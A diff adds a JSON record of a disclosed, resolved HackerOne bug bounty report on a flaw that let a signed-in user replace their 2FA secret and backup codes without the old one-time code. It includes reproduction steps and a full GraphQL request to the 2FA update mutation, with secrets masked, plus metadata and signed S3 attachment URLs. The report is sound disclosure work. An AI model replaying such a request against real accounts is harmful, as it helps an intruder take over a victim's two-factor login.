@@ -1,0 +1,152 @@
+{
+  "id": 1139535,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTM5NTM1",
+  "url": "https://hackerone.com/reports/1139535",
+  "title": "Changing the 2FA secret key and backup codes without knowing the 2FA OTP",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-29T06:25:48.659Z",
+  "submitted_at": "2021-03-29T06:25:48.715Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "whhackersbr",
+    "url": "/whhackersbr",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-05-06T06:30:09.775Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-06T06:30:09.507Z",
+  "team_member_agreed_on_going_public_at": "2021-05-06T06:14:10.440Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\n After the setup of 2FA, disabling or editing it should require the 2FA OTP.\nBut it can be bypassed.\n\n## Steps To Reproduce:\n\n1) Sign in to a new HackerOne account.\n2) Setup 2FA; and\n3) Try to disable it without knowing the OTP.\n\nYou can't, you need to know the `Authentication Code` or `Backup Code`.\n\n{F1246364}\n\nLet's bypass it:\n\n1) Open Google Authenticator and create a new account using `██████` as the setup key;\n2) Sign in to your HackerOne account;\n3) Replay the HTTP Request below (update `X-Auth-Token`, `password`, and `otp_code` using the OTP generated on Google Authenticator):\n\n```\nPOST /graphql HTTP/1.1\nHost: hackerone.com\ncontent-type: application/json\nX-Auth-Token: ******************************\nContent-Length: 1221\n\n{\"operationName\":\"UpdateTwoFactorAuthenticationCredentials\",\"variables\":{\"password\":\"******************************\",\"otp_code\":\"******************************\",\"signature\":\"f3a55d33972b3ac5433dc1ea3f36bed8b6813bf9\",\"backup_codes\":[\"b144ab9f9bc17195\",\"09cc146d7a382931\",\"95bd3133a5bab481\",\"b54d2a14acc7ff0b\",\"46f36d0d72096963\"],\"totp_secret\":\"███████\",\"backup_code\":\"b144ab9f9bc17195\"},\"query\":\"mutation UpdateTwoFactorAuthenticationCredentials($password: String!, $otp_code: String!, $backup_code: String!, $totp_secret: String!, $backup_codes: [String]!, $signature: String!) {\\n  updateTwoFactorAuthenticationCredentials(input: {password: $password, otp_code: $otp_code, backup_code: $backup_code, totp_secret: $totp_secret, backup_codes: $backup_codes, signature: $signature}) {\\n    was_successful\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    me {\\n      id\\n      remaining_otp_backup_code_count\\n      totp_supported\\n      totp_enabled\\n      remaining_otp_backup_code_count\\n      account_recovery_phone_number\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\nThe 2FA secret key and backup codes will be changed.\nYou didn't need to know the old 2FA OTP to make the changes.\n\n{F1246361}\n\n4) Sign out and try to sign in again.\nNow you need to use the new 2FA OTP, the old one doesn't work anymore.\n\n## Recommendation:\n\nDon't allow changes on 2FA configuration without confirming that the user knows the 2FA OTP.\n\n## Impact\n\nAn attacker can change the 2FA secret key and backup codes without knowing the 2FA OTP of the victim.",
+  "weakness": {
+    "id": 106,
+    "name": "Modification of Assumed-Immutable Data (MAID)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1246361,
+      "file_name": "Captura_de_Tela_2021-03-29_a_s_03.16.57.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9slj653ag48vc1jboico0vj2dj79?response-content-disposition=attachment%3B%20filename%3D%22Captura_de_Tela_2021-03-29_a_s_03.16.57.png%22%3B%20filename%2A%3DUTF-8%27%27Captura_de_Tela_2021-03-29_a_s_03.16.57.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZE5SLRL5%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T231303Z&X-Amz-Expires=2222&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGytusGuUOs%2BXGE%2BmOnlE8GSUI8tHpAOyuZ7X1ZLgiUDAiEA06JbqoUcz3378vb9CcW%2FsKgn9EAZpUrMfr6%2B2lHhA5oquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIr44srZhPCu%2BFbJkiqPBY8tFmcIht%2BNXO1%2Bke0nDdL6tT6Wl%2BXiZI%2B1elyIk0u8A4cqm0erRK0paKn6IZklfEkgu%2BMFrS2wgj%2FZtmiabPKlo%2BlLweGkyiBbGh7Qz0pvJmheQt6n8fZ4dS4CkFWEgEleSZfH%2B7TzhTn52LhDfelcmkRgJvVowl41QUmWWFCCiofh55rBmx92UCZTV27Iu1lx%2F%2BhWu3%2BgrVqUe513oF0GCg5Rs9srYolnuPN7kYqyohaQ08iUCP0yS0t2bGmpBRXjVjFAcKpnXZK1W75uNCIRbxvoblNaKNfDf4yb0DLsa9vzIAotbGrvxfiWkf1GjXF7757J3tb73ipovYZuCMtHt5EXXW3uCbr7re2DnK0%2BGM89znpsyQAJEoXNd8E6RZiLkRrKuPSREqYzXgVAcl2ixm9ptHDYXUyI3Edf9jTONZpqY6%2FXYj7uHhUlqNnJNM6lZpKQNH%2FGDJ5LfQxHDOV0wzskcJsu%2Bm8%2B2rYrBXzGouiYWlmtfGvJrPdH4ETPgn7Ssht6tK68Ux8VynJxk8zGliKXpdMqBs%2F3sf7mpY0SnmRJc7XwTzjnh4odLq%2BKuopahPXZjWC6c0mkSj3TPkuylnUol98vpFUCERBwrI6zP%2FQjpskAVbt8mTlo0pa3pL2PgBWFeClmftVoiwrXb8EIPVrAIPLXgbt3C6Rnk3PmxuNOsuuS6gIRxwZ0A65sAc4AWZ%2BKMq5jPWYjsgzOgSomcFthTDI4A3xJSE2V9kF4EO6LCAdR8nVW%2FvPteid3FqxEhWOCZ0h83ZYa9UWaPKLVKAR2M82dKNLAwgPY%2BAAzbsU4Q%2Fm%2FdVR%2BMOpEgwbT9Ndk%2ByrdrXlF5kSIFWraOl7NLX3x91hZt%2F6UulLohmYwlrXizAY6sQFiU5BItJkkZ1M718A3m16ova71gEURM1cKKI2Pb%2FnPRw85xUtp69rcqoG8d%2F1C9hT%2B2wILFvhC1BtVRr8FUcAUZUvJ9vsU07UQMKJ6DrUZkGHQiX7P2ht1aOYVu37nSZJUumb3vqTYG2Y2qGbO%2BnKggDXeIa2LRWdB3GsAqbyK33bfmOcJsEdGES6QiQYa3IzfFgwnJuhjCojhMLi4S%2B1hLvvfLHJC1VmKd46goOrZ%2F30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d1d27605130811398381fa13dc05074ba3c9301bf86dfa1ff3e02f11935366f5",
+      "file_size": 124598,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1246364,
+      "file_name": "Captura_de_Tela_2021-03-29_a_s_03.21.15.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/14esk82samxt2m2kn79f3ln09fte?response-content-disposition=attachment%3B%20filename%3D%22Captura_de_Tela_2021-03-29_a_s_03.21.15.png%22%3B%20filename%2A%3DUTF-8%27%27Captura_de_Tela_2021-03-29_a_s_03.21.15.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZE5SLRL5%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T231303Z&X-Amz-Expires=2222&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGytusGuUOs%2BXGE%2BmOnlE8GSUI8tHpAOyuZ7X1ZLgiUDAiEA06JbqoUcz3378vb9CcW%2FsKgn9EAZpUrMfr6%2B2lHhA5oquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIr44srZhPCu%2BFbJkiqPBY8tFmcIht%2BNXO1%2Bke0nDdL6tT6Wl%2BXiZI%2B1elyIk0u8A4cqm0erRK0paKn6IZklfEkgu%2BMFrS2wgj%2FZtmiabPKlo%2BlLweGkyiBbGh7Qz0pvJmheQt6n8fZ4dS4CkFWEgEleSZfH%2B7TzhTn52LhDfelcmkRgJvVowl41QUmWWFCCiofh55rBmx92UCZTV27Iu1lx%2F%2BhWu3%2BgrVqUe513oF0GCg5Rs9srYolnuPN7kYqyohaQ08iUCP0yS0t2bGmpBRXjVjFAcKpnXZK1W75uNCIRbxvoblNaKNfDf4yb0DLsa9vzIAotbGrvxfiWkf1GjXF7757J3tb73ipovYZuCMtHt5EXXW3uCbr7re2DnK0%2BGM89znpsyQAJEoXNd8E6RZiLkRrKuPSREqYzXgVAcl2ixm9ptHDYXUyI3Edf9jTONZpqY6%2FXYj7uHhUlqNnJNM6lZpKQNH%2FGDJ5LfQxHDOV0wzskcJsu%2Bm8%2B2rYrBXzGouiYWlmtfGvJrPdH4ETPgn7Ssht6tK68Ux8VynJxk8zGliKXpdMqBs%2F3sf7mpY0SnmRJc7XwTzjnh4odLq%2BKuopahPXZjWC6c0mkSj3TPkuylnUol98vpFUCERBwrI6zP%2FQjpskAVbt8mTlo0pa3pL2PgBWFeClmftVoiwrXb8EIPVrAIPLXgbt3C6Rnk3PmxuNOsuuS6gIRxwZ0A65sAc4AWZ%2BKMq5jPWYjsgzOgSomcFthTDI4A3xJSE2V9kF4EO6LCAdR8nVW%2FvPteid3FqxEhWOCZ0h83ZYa9UWaPKLVKAR2M82dKNLAwgPY%2BAAzbsU4Q%2Fm%2FdVR%2BMOpEgwbT9Ndk%2ByrdrXlF5kSIFWraOl7NLX3x91hZt%2F6UulLohmYwlrXizAY6sQFiU5BItJkkZ1M718A3m16ova71gEURM1cKKI2Pb%2FnPRw85xUtp69rcqoG8d%2F1C9hT%2B2wILFvhC1BtVRr8FUcAUZUvJ9vsU07UQMKJ6DrUZkGHQiX7P2ht1aOYVu37nSZJUumb3vqTYG2Y2qGbO%2BnKggDXeIa2LRWdB3GsAqbyK33bfmOcJsEdGES6QiQYa3IzfFgwnJuhjCojhMLi4S%2B1hLvvfLHJC1VmKd46goOrZ%2F30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2dcbd252527a5d6951b492376f2b067c0f7bba9ca0c91b4092d77f46de55f66",
+      "file_size": 160145,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-06-05T06:14:10.625Z",
+  "allow_singular_disclosure_after": -148755532.67324004,
+  "singular_disclosure_allowed": true,
+  "vote_count": 56,
+  "voters": [
+    "arist0phanes",
+    "mlucas",
+    "battle_angel",
+    "whhackersbr",
+    "mattberg",
+    "caon",
+    "shreyaschavhan",
+    "ali",
+    "dnelsaka",
+    "nightm4re",
+    "and 46 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "physical",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 70332,
+    "asset_type": "URL",
+    "asset_identifier": "http://hackerone.com/graphql",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
